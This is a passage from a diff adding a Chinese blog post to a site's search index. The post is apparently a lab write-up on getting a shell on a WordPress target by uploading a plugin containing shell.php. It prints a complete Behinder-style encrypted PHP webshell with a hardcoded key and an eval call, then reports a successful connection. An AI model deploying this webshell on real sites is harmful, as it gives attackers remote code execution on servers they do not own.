+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220400884.png" alt="image-20250119220400884"></p>
+<p>一般来说，WordPress的插件目录在 &#x2F;wp-content&#x2F;plugins&#x2F;</p>
+<p>我这个在<strong>print-my-blog&#x2F;shell.php</strong>这个目录下，启用试试能不能获得shell</p>
+<p>完整目录</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">http://node.hackhub.<span class="built_in">get</span>-<span class="keyword">shell</span>.<span class="keyword">com</span>:<span class="number">52581</span>/<span class="keyword">wp</span>-content/plugins/<span class="keyword">print</span>-my-blog/<span class="keyword">shell</span>.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220558502.png" alt="image-20250119220558502"></p>
+<p>尝试了一下一些命令都无法执行，cmd&#x3D;phpinfo();可以执行看到了很多函数都被禁用了</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250120093635723.png" alt="image-20250120093635723"></p>
+<p>掏出我上次的冰蝎webshell试试</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;dfff0a7fa1a55c8c&quot;</span>; </span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把之前的插件删掉，从新准备webshell再次上传试试</p>
+<p>成功连接</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250120094056789.png" alt="image-20250120094056789"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
 </search>
